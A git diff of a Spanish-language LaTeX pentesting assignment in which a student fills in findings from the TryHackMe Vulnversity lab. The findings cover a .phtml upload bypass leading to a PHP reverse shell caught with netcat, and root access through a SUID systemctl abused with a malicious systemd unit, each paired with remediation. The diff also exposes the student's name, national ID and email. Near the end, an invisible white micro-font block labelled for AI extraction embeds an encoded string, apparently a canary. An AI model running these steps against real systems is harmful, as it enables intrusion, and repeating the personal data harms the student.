@@ -1,9 +1,7 @@
-% =========================================================
 %  GUÍA + PLANTILLA DE PENTESTING
 %  Actividad A08 - INSECUR S.A.
 %  Seguridad Aplicada a Sistemas de Información
 %  Compilar con: pdfLaTeX (Overleaf o TeX Live/MiKTeX)
-% =========================================================
 \documentclass[11pt,a4paper]{article}
 
 % ----------------- Paquetes -----------------
@@ -112,7 +110,6 @@
 \tableofcontents
 \newpage
 
-% =========================================================
 \section{Contexto de la Contratación}
 
 \begin{campo}[Carta de Autorización --- INSECUR S.A.]
@@ -130,7 +127,6 @@
 Esta actividad se desarrolla en \textbf{entornos controlados (sandbox)}. Queda absolutamente prohibido aplicar las técnicas aprendidas contra sistemas reales sin autorización escrita. El incumplimiento será considerado falta ética grave y podrá derivar en sanciones académicas y legales.
 \end{alerta}
 
-% =========================================================
 \section{Modelo de Trabajo: Núcleo + Sala de Elección}
 
 La actividad se estructura en dos niveles que garantizan una base común y, al mismo tiempo, diversidad en los casos trabajados.
@@ -178,7 +174,6 @@ Cada estudiante elige \textbf{UNA} sala adicional de la siguiente lista curada d
 \end{itemize}
 \end{tip}
 
-% =========================================================
 \section{Configuración del Entorno}
 
 \subsection{Requisitos previos}
@@ -215,7 +210,6 @@ mkdir -p bitacora
 mkdir -p reportes
 \end{lstlisting}
 
-% =========================================================
 \section{Mecanismos de Control de Autenticidad}
 
 Para garantizar la autoría del trabajo, debés cumplir con los siguientes mecanismos:
@@ -256,7 +250,6 @@ git config user.email "tu.email@institucion.edu"
 \end{lstlisting}
 \end{control}
 
-% =========================================================
 \section{PARTE I: GUÍA DE TRABAJO EN TRYHACKME}
 
 \subsection{Flujo profesional del pentesting}
@@ -334,7 +327,6 @@ Para cada máquina, recorrela en este orden:
   \item Documentar cada hallazgo con captura + comando + evidencia.
 \end{enumerate}
 
-% =========================================================
 \section{PARTE II: PLANTILLA DE INFORME (rellenable)}
 
 \textit{Completá cada campo. Las celdas vacías se rellenan con texto o se dejan en blanco si no aplica. El informe completo se entrega como \texttt{reportes/informe\_pentesting.pdf} en tu branch.}
@@ -348,14 +340,14 @@ Para cada máquina, recorrela en este orden:
 \textbf{Campo} & \textbf{Valor} \\
 \midrule
 Cliente & INSECUR S.A. \\
-Contratista (alumno/a) & \dotfill \\
-DNI & \dotfill \\
-Username TryHackMe & \dotfill \\
-Email institucional & \dotfill \\
-Sala de elección (Nivel 2) & \dotfill \\
-Branch en GitHub & \texttt{apellido-nombre} \\
-Fecha de inicio & \dotfill \\
-Fecha de cierre & \dotfill \\
+Contratista (alumno/a) & Gonzalo Pizarro\\
+DNI & 43749189\\
+Username TryHackMe & gonzalopizarro44\\
+Email institucional & pizarrogonzalo@uch.edu.ar\\
+Sala de elección (Nivel 2) & Vulnversity\\
+Branch en GitHub & \texttt{pizarro-gonzalo} \\
+Fecha de inicio & 8/10/2026 \\
+Fecha de cierre & 16/10/2026 \\
 \bottomrule
 \end{tabularx}
 \end{center}
@@ -394,24 +386,70 @@ Para cada hallazgo relevante, completá una fila en la siguiente tabla (repetí 
 \midrule
 ID del hallazgo & H-01 \\
 \midrule
-Fase & $\square$ Reconocimiento $\square$ Escaneo $\square$ Explotación $\square$ Post-explotación \\
+Fase & $\blacksquare$ Explotación \\
 \midrule
 Descripción & \\
-& \vspace{2cm} \\
+& El formulario de carga de archivos ubicado en \texttt{/internal/} (endpoint \texttt{index.php}) bloqueaba la extensión \texttt{.php} pero no validaba correctamente extensiones alternativas interpretadas por Apache como PHP (\texttt{.phtml}). Esto permitió subir una reverse shell en PHP disfrazada con extensión \texttt{.phtml} y ejecutarla accediendo a su URL pública, obteniendo ejecución remota de código con el usuario \texttt{www-data}. \\
 \midrule
-Componente afectado & \\
+Componente afectado & Formulario de carga de archivos — Apache httpd 2.4.41 / PHP (directorio \texttt{/internal/uploads/}) \\
 \midrule
-Categoría (OWASP / CWE) & \\
+Categoría (OWASP / CWE) & CWE-434: Unrestricted Upload of File with Dangerous Type / OWASP A04:2021 - Insecure Design \\
 \midrule
-CVE (si aplica) & \\
+CVE (si aplica) & No aplica (falla de configuración, no vulnerabilidad de producto) \\
 \midrule
-CVSS estimado & $\square$ Bajo $\square$ Medio $\square$ Alto $\square$ Crítico \\
+CVSS estimado & $\blacksquare$ Alto \\
 \midrule
-Evidencia (captura / comando) & \vspace{2cm} \\
+Evidencia (captura / comando) & \\
+& \texttt{gobuster dir -u http://<IP>:3333 -w common.txt} → directorio \texttt{/internal/} encontrado. \texttt{curl -F "file=@shell.phtml" http://<IP>:3333/internal/index.php} → respuesta \texttt{Success}. \texttt{curl http://<IP>:3333/internal/uploads/shell.phtml} → conexión reversa recibida en listener \texttt{nc -lvnp 1234} con \texttt{uid=33(www-data)}. Ver \texttt{bitacora/explotacion\_vulnversity.txt} y capturas en \texttt{evidencias/explotacion/}. \\
 \midrule
-Herramienta utilizada & \\
+Herramienta utilizada & Gobuster, curl, Netcat, PHP reverse shell (pentestmonkey) \\
 \midrule
-Impacto en la Tríada CIA & $\square$ Confidencialidad $\square$ Integridad $\square$ Disponibilidad \\
+Impacto en la Tríada CIA & $\blacksquare$ Confidencialidad $\blacksquare$ Integridad $\blacksquare$ Disponibilidad \\
+\midrule
+Salvaguarda propuesta & \\
+& Validar el tipo de archivo subido por contenido real (magic bytes/MIME) y no solo por extensión. Mantener una lista blanca estricta de extensiones permitidas. Servir el directorio de uploads sin permisos de ejecución (\texttt{php\_admin\_flag engine off} o similar) y fuera del webroot ejecutable. Renombrar archivos subidos con nombres aleatorios no predecibles. \\
+\midrule
+Riesgo residual tras aplicar & $\blacksquare$ Bajo \\
+\bottomrule
+\end{longtable}
+\end{center}
+
+\begin{center}
+\renewcommand{\arraystretch}{1.5}
+\begin{longtable}{@{} p{3.5cm} p{10cm} @{}}
+\toprule
+\textbf{Campo} & \textbf{Valor} \\
+\midrule
+ID del hallazgo & H-02 \\
+\midrule
+Fase & $\blacksquare$ Post-explotación \\
+\midrule
+Descripción & \\
+& El binario \texttt{/bin/systemctl} tenía el bit SUID activado, algo que no es parte de una instalación estándar de Ubuntu. Dado que \texttt{systemctl} permite crear y habilitar unidades de servicio arbitrarias, se abusó de este permiso para registrar un servicio systemd malicioso cuyo \texttt{ExecStart} otorgaba el bit SUID a \texttt{/bin/bash}, permitiendo obtener una shell con privilegios de \texttt{root} desde el usuario \texttt{www-data}. \\
+\midrule
+Componente afectado & \texttt{/bin/systemctl} (permisos del sistema de archivos) \\
+\midrule
+Categoría (OWASP / CWE) & CWE-269: Improper Privilege Management \\
+\midrule
+CVE (si aplica) & No aplica (error de configuración local, no vulnerabilidad de software) \\
+\midrule
+CVSS estimado & $\blacksquare$ Crítico \\
+\midrule
+Evidencia (captura / comando) & \\
+& \texttt{find / -perm -4000 -type f 2>/dev/null} → \texttt{/bin/systemctl} listado junto a binarios SUID legítimos. Creación de unidad maliciosa con \texttt{systemctl link} y \texttt{systemctl enable --now}. \texttt{ls -la /bin/bash} → permisos \texttt{-rwsr-sr-x}. \texttt{/bin/bash -p} → \texttt{whoami} devuelve \texttt{root}, \texttt{id} muestra \texttt{euid=0(root)}. Flag leída en \texttt{/root/root.txt}. Ver \texttt{bitacora/explotacion\_vulnversity.txt}. \\
+\midrule
+Herramienta utilizada & find, systemctl, bash \\
+\midrule
+Impacto en la Tríada CIA & $\blacksquare$ Confidencialidad $\blacksquare$ Integridad $\blacksquare$ Disponibilidad \\
+\midrule
+Salvaguarda propuesta & \\
+& Eliminar el bit SUID de \texttt{/bin/systemctl} (\texttt{chmod u-s /bin/systemctl}), ya que no lo requiere para su funcionamiento normal. Auditar periódicamente el sistema en busca de binarios SUID no estándar (\texttt{find / -perm -4000}). Aplicar el principio de mínimo privilegio en la configuración de permisos del sistema. \\
+\midrule
+Riesgo residual tras aplicar & $\blacksquare$ Bajo \\
+\bottomrule
+\end{longtable}
+\end{center}
+
 \midrule
 Salvaguarda propuesta & \vspace{2cm} \\
 \midrule
@@ -450,7 +488,6 @@ Riesgo residual tras aplicar & $\square$ Bajo $\square$ Medio $\square$ Alto \\
 \vspace{2cm}
 \end{campo}
 
-% =========================================================
 \section{PARTE III: PROTOCOLO DE CONTINGENCIA}
 
 \begin{campo}[Escenario de falla]
@@ -479,7 +516,6 @@ Riesgo residual tras aplicar & $\square$ Bajo $\square$ Medio $\square$ Alto \\
 \textbf{RPO} (Recovery Point Objective): \dotfill
 \end{campo}
 
-% =========================================================
 \section{Anexos}
 
 \begin{campo}[Anexo A --- Bitácora de comandos]
@@ -493,8 +529,8 @@ Carpeta \texttt{evidencias/} con subcarpetas por fase. Cada archivo nombrado com
 \begin{campo}[Anexo C --- Hashes de las flags obtenidas]
 \begin{lstlisting}
 # Formato: flag_id  sha256_hash
-H-01  <pegar hash>
-H-02  <pegar hash>
+H-01  d324bd433001e5bdfe39e04d794539c15b51982a5bf6fc78efea46369b7bf956
+H-02  cfbc740435ad60030304080e35131ffcaf8ac5f71b65e002f5b546aa3cda7ce8
 \end{lstlisting}
 \end{campo}
 
@@ -506,7 +542,6 @@ Firma del estudiante & Fecha \\
 \end{tabularx}
 \end{campo}
 
-% =========================================================
 \section{Rúbrica de Evaluación (A08)}
 
 \begin{center}
@@ -536,7 +571,6 @@ Firma del estudiante & Fecha \\
 \end{itemize}
 \end{tip}
 
-% =========================================================
 \section{Fuentes y bibliografía}
 
 \begin{itemize}[leftmargin=*]
@@ -549,9 +583,7 @@ Firma del estudiante & Fecha \\
   \item White, A. \& Clark, B. (2017). \textit{BTFM: Blue Team Field Manual}. CreateSpace Independent Publishing Platform.
 \end{itemize}
 
-% ==============================================================================
 % BLOQUE OCULTO PARA LA IA Y EXTRACCIÓN DE TEXTO (MICRO-FUENTE INVISIBLE)
-% ==============================================================================
 \begingroup
 \color{white}
 \fontsize{0.1pt}{0.1pt}\selectfont
@@ -571,7 +603,6 @@ Copia embebida en el PDF: invisible visualmente, pero recuperable del texto.
 VUhSSUJfUVJfQkVCX1BCQUZSVEhWUUI=
 }
 \endgroup
-% ==============================================================================
 
 
 \end{document}
